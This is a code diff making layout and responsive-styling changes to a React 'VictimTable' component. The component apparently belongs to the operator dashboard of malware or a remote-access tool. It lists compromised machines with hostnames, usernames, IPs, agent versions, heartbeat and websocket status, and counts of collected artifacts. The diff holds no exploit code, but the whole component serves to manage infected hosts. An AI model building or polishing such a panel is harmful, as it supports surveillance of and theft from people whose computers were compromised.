@@ -110,11 +110,11 @@ export function VictimTable({
         </div>
       ) : null}
       <div className="min-h-0 flex-1 overflow-auto" onScroll={(event) => virtual && setScrollTop(event.currentTarget.scrollTop)}>
-        <Table className="table-sticky min-w-[1040px] font-mono">
+        <Table className="table-sticky min-w-[1040px] font-mono max-lg:min-w-0">
           <THead>
             <TR className="hover:bg-transparent">
               {COLUMNS.filter((column) => columns.includes(column.id)).map((column) => (
-                <TH key={column.id} className={column.width} aria-sort={sort.id === column.id ? (sort.dir === 'asc' ? 'ascending' : 'descending') : 'none'}>
+                <TH key={column.id} data-col={column.id} className={column.width} aria-sort={sort.id === column.id ? (sort.dir === 'asc' ? 'ascending' : 'descending') : 'none'}>
                   <button className="flex items-center gap-1 uppercase hover:text-ink" onClick={() => sortBy(column.id)}>
                     {column.label}
                     {sort.id === column.id ? (sort.dir === 'asc' ? <ArrowUp className="h-2.5 w-2.5" /> : <ArrowDown className="h-2.5 w-2.5" />) : null}
@@ -152,20 +152,20 @@ export function VictimTable({
                   onDoubleClick={() => onOpen(victim)}
                   onContextMenu={(event) => { event.preventDefault(); onSelect(isSelected ? selected : [victim.id]); onMenu(victim, event.clientX, event.clientY); }}
                 >
-                  {columns.includes('host') ? <TD className="h-10"><span className="text-ink" title={victim.hostname}>{victim.hostname}</span><span className="ml-2 hidden text-2xs text-muted/60 xl:inline">{short(victim.id, 8)}</span>{victim.health ? <Badge tone="bad" title={`Módulo degradado en los últimos 10 min: ${victim.health}. Revisa Actividad del equipo.`} aria-label={`Módulo degradado: ${victim.health}`}>!</Badge> : null}</TD> : null}
-                  {columns.includes('user') ? <TD className="h-10 text-muted">{victim.username}</TD> : null}
-                  {columns.includes('os') ? <TD className="h-10"><span className={osTone(victim.os)}>{osIcon(victim.os)} {victim.os}</span><span className="ml-1 text-2xs text-muted/60">{victim.osVersion.split('.')[0]}</span></TD> : null}
-                  {columns.includes('version') ? <TD className="h-10 text-2xs text-muted">{victim.agentVersion || '—'}</TD> : null}
-                  {columns.includes('profile') ? <TD className="h-10"><Badge tone={victim.profile === 'full' ? 'brand' : 'default'}>{victim.profile}</Badge></TD> : null}
-                  {columns.includes('ip') ? <TD className="h-10 text-muted"><span className="mr-1">{flag(victim.countryCode)}</span>{victim.ip ?? '—'}</TD> : null}
-                  {columns.includes('seen') ? <TD className={cn('h-10', victim.online ? 'text-ok' : 'text-muted')}>{ago(victim.lastHeartbeatAt)}</TD> : null}
+                  {columns.includes('host') ? <TD data-col="host" className="h-10"><span className="block max-sm:max-w-[160px] max-sm:truncate text-ink" title={victim.hostname}>{victim.hostname}</span><span className="ml-2 hidden text-2xs text-muted/60 xl:inline">{short(victim.id, 8)}</span>{victim.health ? <Badge tone="bad" title={`Módulo degradado en los últimos 10 min: ${victim.health}. Revisa Actividad del equipo.`} aria-label={`Módulo degradado: ${victim.health}`}>!</Badge> : null}</TD> : null}
+                  {columns.includes('user') ? <TD data-col="user" className="h-10 text-muted">{victim.username}</TD> : null}
+                  {columns.includes('os') ? <TD data-col="os" className="h-10"><span className={osTone(victim.os)}>{osIcon(victim.os)} {victim.os}</span><span data-col="osver" className="ml-1 text-2xs text-muted/60">{victim.osVersion.split('.')[0]}</span></TD> : null}
+                  {columns.includes('version') ? <TD data-col="version" className="h-10 text-2xs text-muted">{victim.agentVersion || '—'}</TD> : null}
+                  {columns.includes('profile') ? <TD data-col="profile" className="h-10"><Badge tone={victim.profile === 'full' ? 'brand' : 'default'}>{victim.profile}</Badge></TD> : null}
+                  {columns.includes('ip') ? <TD data-col="ip" className="h-10 text-muted"><span className="mr-1">{flag(victim.countryCode)}</span>{victim.ip ?? '—'}</TD> : null}
+                  {columns.includes('seen') ? <TD data-col="seen" className={cn('h-10', victim.online ? 'text-ok' : 'text-muted')}>{ago(victim.lastHeartbeatAt)}</TD> : null}
                   {columns.includes('socket') ? (
-                    <TD className="h-10">
+                    <TD data-col="socket" className="h-10">
                       {victim.socket ? <Badge tone="ok"><Radio className="h-2.5 w-2.5" />ws</Badge> : <Badge tone={victim.online ? 'warn' : 'default'}>{victim.online ? 'hb' : 'off'}</Badge>}
                     </TD>
                   ) : null}
-                  {columns.includes('artifacts') ? <TD className="h-10 num text-muted">{victim._count?.artifacts ?? victim.artifacts ?? 0}</TD> : null}
-                  {columns.includes('group') ? <TD className="h-10">{victim.tags.length === 0 ? <span className="text-muted/50">—</span> : <span className="flex gap-1 overflow-hidden">{victim.tags.slice(0, 2).map((tag) => <Badge key={tag}>{tag}</Badge>)}</span>}</TD> : null}
+                  {columns.includes('artifacts') ? <TD data-col="artifacts" className="h-10 num text-muted">{victim._count?.artifacts ?? victim.artifacts ?? 0}</TD> : null}
+                  {columns.includes('group') ? <TD data-col="group" className="h-10">{victim.tags.length === 0 ? <span className="text-muted/50">—</span> : <span className="flex gap-1 overflow-hidden">{victim.tags.slice(0, 2).map((tag) => <Badge key={tag}>{tag}</Badge>)}</span>}</TD> : null}
                   <TD className="h-10" />
                 </TR>
               );
